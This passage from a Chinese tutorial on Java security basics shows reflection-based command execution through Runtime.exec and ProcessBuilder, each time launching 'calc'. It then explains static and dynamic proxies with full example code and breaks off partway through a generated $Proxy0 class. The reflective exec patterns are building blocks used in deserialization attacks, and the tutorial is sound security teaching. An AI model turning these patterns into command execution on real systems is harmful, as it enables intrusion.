<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p>改写成反射形式如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(</span><br><span class="line">        Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(</span><br><span class="line">                <span class="literal">null</span></span><br><span class="line">        ),</span><br><span class="line">        <span class="string">&quot;calc&quot;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure></div>

<p>当然，也可以使用 <code>getDeclaredConstructor</code> 获取 <code>Runtime</code> 的私有构造来创建 <code>Runtime</code> 实例。不过高版本 JDK 调用私有构造类需要绕过。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; runtimeClass = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">Constructor&lt;?&gt; runtimeConstructor = runtimeClass.getDeclaredConstructor();</span><br><span class="line">setFieldValue(runtimeConstructor,<span class="string">&quot;modifiers&quot;</span>, Modifier.PUBLIC);</span><br><span class="line">runtimeConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">runtimeInstance</span> <span class="operator">=</span> runtimeConstructor.newInstance();</span><br><span class="line"><span class="type">Method</span> <span class="variable">execMethod</span> <span class="operator">=</span> runtimeClass.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">execMethod.invoke(runtimeInstance, <span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<h3 id="ProcessBuilder"><a href="#ProcessBuilder" class="headerlink" title="ProcessBuilder"></a>ProcessBuilder</h3><p><code>java.lang.ProcessBuilder</code> 是 Java 中用于创建和管理操作系统进程的一个类，我们可以用来执行命令。对应 <code>java</code> 语句如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;calc&quot;</span>)).start();</span><br></pre></td></tr></table></figure></div>

<p>改写成反射形式如下，其中 <code>ProcessBuilder</code> 的构造函数参数是可变参数，因此需要传入 <code>List</code>：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>).getMethod(<span class="string">&quot;start&quot;</span>).invoke(</span><br><span class="line">        Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>).getConstructor(String[].class).newInstance(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">String</span>[][]&#123;&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;&#125;</span><br><span class="line">        )</span><br><span class="line">);</span><br></pre></td></tr></table></figure></div>

<h1 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h1><p>在 Java 编程中，代理模式是一种设计模式，它允许开发者<strong>在方法调用的前后插入额外的逻辑</strong>。这种技术在许多实际应用中非常有用，例如日志记录、事务管理和安全检查。Java 代理模式可以分为<strong>静态代理</strong>和<strong>动态代理</strong>。</p>
<h2 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h2><h3 id="静态代理的概念"><a href="#静态代理的概念" class="headerlink" title="静态代理的概念"></a>静态代理的概念</h3><p>静态代理是指在编译时由开发者创建的代理类。代理类与被代理类实现相同的接口，并在代理类中调用被代理类的方法。代理类可以在调用方法前后添加额外的逻辑。</p>
<h3 id="静态代理的实现"><a href="#静态代理的实现" class="headerlink" title="静态代理的实现"></a>静态代理的实现</h3><p><strong>静态代理有两种实现方式：</strong></p>
<ul>
<li><strong>基于接口的实现</strong> ：代理类实现与目标类相同的接口，并通过接口调用目标对象的方法。基于接口的代理实现方式灵活，可以代理多个不同类的实例，因此耦合度较低。</li>
<li><strong>基于继承的实现</strong> ：代理类通过继承目标类来实现代理，通常会重写目标类的方法并添加额外功能。基于继承的代理只能代理特定的目标类，无法代理其他类。因此，它的<strong>耦合度较高</strong>，因为代理类和目标类紧密绑定。这种实现方式在实际中很少使用。</li>
</ul>
<p>我们以一个简单的服务接口 <code>Service</code> 和它的实现类 <code>RealService</code> 为例，展示静态代理的实现。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Service</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">perform</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RealService</span> <span class="keyword">implements</span> <span class="title class_">Service</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">perform</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Performing service...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ServiceProxy</span> <span class="keyword">implements</span> <span class="title class_">Service</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> RealService realService;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ServiceProxy</span><span class="params">(RealService realService)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.realService = realService;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">perform</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 在调用实际方法之前的操作</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Before performing service...&quot;</span>);</span><br><span class="line">        <span class="comment">// 调用实际方法</span></span><br><span class="line">        realService.perform();</span><br><span class="line">        <span class="comment">// 在调用实际方法之后的操作</span></span><br><span class="line">        System.out.println(<span class="string">&quot;After performing service...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">StaticProxyDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">RealService</span> <span class="variable">realService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RealService</span>();</span><br><span class="line">        <span class="type">Service</span> <span class="variable">serviceProxy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServiceProxy</span>(realService);</span><br><span class="line">        serviceProxy.perform();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在上述代码中定义了 <strong><code>Service</code> 接口</strong>以及针对这个接口的<strong>代理类</strong>和<strong>实现类</strong> ：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/11/Java%20%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/images/static_proxy.svg"
                      alt="static_proxy"
                ></p>
<ul>
<li><strong>Service 接口</strong> ：定义了 <code>perform</code> 方法。</li>
<li><strong>RealService 类</strong> ：是 <code>Service</code> 接口的实现类，实际业务逻辑在此实现。</li>
<li><strong>ServiceProxy 类</strong> ：是静态代理类，控制对 <code>RealService</code> 的方法调用，允许在方法调用前后添加自定义逻辑。</li>
</ul>
<p>在 <code>main</code> 方法中，通过代理类 <code>ServiceProxy</code> 来调用实际的 <code>perform</code> 方法。这个过程就是静态代理。</p>
<h2 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h2><h3 id="动态代理的概念"><a href="#动态代理的概念" class="headerlink" title="动态代理的概念"></a>动态代理的概念</h3><p>动态代理指的是<strong>在运行时动态生成代理类</strong>，而不是在编译时手动编写。Java 提供了<strong>基于接口的动态代理</strong>和基<strong>于类的动态代理</strong>（通过第三方库实现，如 CGLIB）。</p>
<ul>
<li><strong>基于接口的动态代理</strong> ：使用 JDK 提供的 <code>java.lang.reflect.Proxy</code> 类和 <code>InvocationHandler</code> 接口。</li>
<li><strong>基于类的动态代理</strong> ：通常使用 CGLIB 或者其他字节码操作库实现。</li>
</ul>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content">
      <p>由于静态代理需要针对每个接口都需要手动编写代理类，并且每当接口发生变化的时候都要去修改对应的代理类，代码耦合度还是太高了。</p>
<p>针对静态代理的这一缺点进一步衍生出<strong>动态代理</strong>。在动态代理中我们不需要针对接口手动编写代理类，而是在代码运行过程中针对接口动态生成代理类。动态代理类会将函数调用转发到我们自己编写的处理函数中，然后由处理函数决定在被代理函数前后需要执行什么样的代码。</p>

    </div>
  </div>

<h3 id="基于接口的动态代理"><a href="#基于接口的动态代理" class="headerlink" title="基于接口的动态代理"></a>基于接口的动态代理</h3><p><strong>基于接口的动态代理</strong>使用 JDK 提供的 <code>java.lang.reflect.Proxy</code> 类和 <code>InvocationHandler</code> 接口创建代理。代理对象通过实现一个或多个接口，在运行时动态生成并委托给 <code>InvocationHandler</code> 进行方法调用。适用于目标类实现了接口的场景。</p>
<h4 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h4><p>由于我们要生成的代理类通过 <code>Proxy</code> 的 <code>newProxyInstance</code> 生成，该方法的原型如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">newProxyInstance</span><span class="params">(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler h)</span>;</span><br></pre></td></tr></table></figure></div>

<p>该方法生成代理类的时候需要以下几个参数：</p>
<ul>
<li><strong>被代理类的类加载器 <code>loader</code></strong> ：动态代理类本身是由 Java 在运行时动态生成的类，而这些动态生成的类需要通过类加载器加载到 JVM 中。通过传入目标类的类加载器，Java 知道该使用哪个类加载器来加载生成的代理类。</li>
<li><strong>被代理类实现的接口 <code>interfaces</code></strong> ：生成的代理类需要继承被代理类实现的接口，因此需要传入被代理类实现的接口。注意这里 <code>interfaces</code> 是数组类型，这是因为一个类可能实现了多个接口，而生成的动态代理类同样需要实现这些接口从而代理这些接口的方法。</li>
<li><strong><code>InvocationHandler</code> 接口的实现 <code>h</code></strong> ：动态代理的核心在于方法调用的拦截和转发。每当代理对象的方法被调用时，<code>InvocationHandler</code> 的 <code>invoke()</code> 方法会被触发。因此我们需要传入 <code>InvocationHandler</code> 接口的实现才能确保对被代理对象方法的调用被转发到 <code>InvocationHandler</code> 接口的实现类的 <code>invoke</code> 方法上。</li>
</ul>
<p>这几个参数的关系如下图所示：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/11/Java%20%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/images/dynamic_proxy.svg"
                      alt="dynamic_proxy"
                ></p>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content">
      <p>由于生成代理类的所需的参数较多，一种常用的技巧就是在 <code>InvocationHandler</code> 接口的实现类 <code>ServiceInvocationHandler</code> 的构造函数传入被代理的对象 <code>realService</code> 并保存。然后在 <code>ServiceInvocationHandler</code> 中定义 <code>getProxyInstance</code> 方法根据前面保存的 <code>realService</code> 以及 <code>ServiceInvocationHandler</code> 本身生成 <code>Proxy.newProxyInstance</code> 的参数进而生成代理对象。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 封装获取动态代理对象的方法</span></span><br><span class="line"><span class="keyword">public</span> &lt;T&gt; T <span class="title function_">getProxyInstance</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (T) Proxy.newProxyInstance(</span><br><span class="line">            realService.getClass().getClassLoader(),</span><br><span class="line">            realService.getClass().getInterfaces(),</span><br><span class="line">            <span class="built_in">this</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

    </div>
  </div>

<p>在调用被代理类 <code>RealService</code> 的方法时，代理类会将调用转发至 <code>InvocationHandler</code> 接口的实现类 <code>ServiceInvocationHandler</code> 的 <code>invoke</code> 方法上。该方法的原型如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><p><strong><code>proxy</code></strong> ：动态生成的代理类对象。</p>
</li>
<li><p><strong><code>method</code></strong> ：调用的被代理的方法对应的 <code>Method</code> 对象。</p>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content">
      <p>这里直接提供了被代理方法的 <code>Method</code> 对象，因此动态代理的用法就十分灵活了。例如 MyBatis 框架就利用在这里利用 <code>Method</code> 对象反射解析接口中的 SQL 语句注解，然后根据传入的参数执行 SQL 语句并返回，而没有使用代理原本的功能，即 MyBatis 代理的接口没有实现类。</p>

    </div>
  </div>
</li>
<li><p><strong><code>args</code></strong> ：调用的被代理的方法时传入的参数列表。</p>
</li>
</ul>

  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>注意</p>

    </div>
    <div class="notel-content">
      <p><code>invoke</code> 方法的第一个参数是代理类对象而不是被代理对象，因此不能像 <code>method.invoke(proxy, args)</code> 这样调用被代理对象的方法，而是使用先前 <code>InvocationHandler</code> 接口的实现类的构造函数保存的被代理对象调用对应的被代理方法。</p>

    </div>
  </div>

<p>完整的动态代理示例代码如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Service</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">perform</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RealService</span> <span class="keyword">implements</span> <span class="title class_">Service</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">perform</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Performing service...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现InvocationHandler接口</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ServiceInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Object realService;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ServiceInvocationHandler</span><span class="params">(Object realService)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.realService = realService;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="comment">// 在调用实际方法之前的操作</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Before method: &quot;</span> + method.getName());</span><br><span class="line">        <span class="comment">// 调用实际方法</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> method.invoke(realService, args);</span><br><span class="line">        <span class="comment">// 在调用实际方法之后的操作</span></span><br><span class="line">        System.out.println(<span class="string">&quot;After method: &quot;</span> + method.getName());</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 封装获取动态代理对象的方法</span></span><br><span class="line">    <span class="keyword">public</span> &lt;T&gt; T <span class="title function_">getProxyInstance</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (T) Proxy.newProxyInstance(</span><br><span class="line">                realService.getClass().getClassLoader(),</span><br><span class="line">                realService.getClass().getInterfaces(),</span><br><span class="line">                <span class="built_in">this</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用动态代理</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DynamicProxyDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">RealService</span> <span class="variable">realService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RealService</span>();</span><br><span class="line">        <span class="type">ServiceInvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServiceInvocationHandler</span>(realService);</span><br><span class="line">        <span class="comment">// 创建动态代理对象</span></span><br><span class="line">        <span class="type">Service</span> <span class="variable">proxyInstance</span> <span class="operator">=</span> handler.getProxyInstance();</span><br><span class="line">        <span class="comment">// 调用代理对象的方法</span></span><br><span class="line">        proxyInstance.perform();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h4><p>添加如下代码将系统属性 <code>sun.misc.ProxyGenerator.saveGeneratedFiles</code> 设置为 <code>true</code> 就可以将生成的动态代理类保存在当前目录下。</p>
<blockquote>
<p><strong>从 JDK 9 开始，<code>sun.misc.ProxyGenerator.saveGeneratedFiles</code> 已不再起作用</strong>，这是因为 JDK 模块化和对内部 API 的限制。</p>
</blockquote>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.getProperties().put(<span class="string">&quot;sun.misc.ProxyGenerator.saveGeneratedFiles&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p>运行后得到的动态代理类 <code>$Proxy0</code> 如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.UndeclaredThrowableException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">$Proxy0</span> <span class="keyword">extends</span> <span class="title class_">Proxy</span> <span class="keyword">implements</span> <span class="title class_">Service</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 存储目标方法的 Method 对象</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Method equalsMethod;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Method toStringMethod;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Method hashCodeMethod;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Method performMethod;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构造函数，接收 InvocationHandler 作为参数</span></span><br><span class="line">    <span class="keyword">public</span> $Proxy0(InvocationHandler handler) <span class="keyword">throws</span>  &#123;</span><br><span class="line">        <span class="built_in">super</span>(handler);  <span class="comment">// 将 handler 传递给 Proxy 类的构造函数</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 重写 equals 方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object obj)</span> <span class="keyword">throws</span>  &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 使用 InvocationHandler 调用目标类的 equals 方法</span></span><br><span class="line">            <span class="keyword">return</span> (Boolean) <span class="built_in">super</span>.h.invoke(<span class="built_in">this</span>, equalsMethod, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj&#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException | Error ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> ex;  <span class="comment">// 重新抛出 RuntimeException 或 Error</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UndeclaredThrowableException</span>(ex);  <span class="comment">// 处理其他异常</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 重写 toString 方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> String <span class="title function_">toString</span><span class="params">()</span> <span class="keyword">throws</span>  &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 使用 InvocationHandler 调用目标类的 toString 方法</span></span><br><span class="line">            <span class="keyword">return</span> (String) <span class="built_in">super</span>.h.invoke(<span class="built_in">this</span>, toStringMethod, (Object[]) <span class="literal">null</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException | Error ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> ex;  <span class="comment">// 重新抛出 RuntimeException 或 Error</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UndeclaredThrowableException</span>(ex);  <span class="comment">// 处理其他异常</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 重写 hashCode 方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> <span class="keyword">throws</span>  &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 使用 InvocationHandler 调用目标类的 hashCode 方法</span></span><br><span class="line">            <span class="keyword">return</span> (Integer) <span class="built_in">super</span>.h.invoke(<span class="built_in">this</span>, hashCodeMethod, (Object[]) <span class="literal">null</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException | Error ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> ex;  <span class="comment">// 重新抛出 RuntimeException 或 Error</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UndeclaredThrowableException</span>(ex);  <span class="comment">// 处理其他异常</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 重写 perform 方法（来自 Service 接口）</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">perform</span><span class="params">()</span> <span class="keyword">throws</span>  &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 使用 InvocationHandler 调用目标类的 perform 方法</span></span><br><span class="line">            <span class="built_in">super</span>.h.invoke(<span class="built_in">this</span>, performMethod, (Object[]) <span class="literal">null</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException | Error ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> ex;  <span class="comment">// 重新抛出 RuntimeException 或 Error</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable ex) 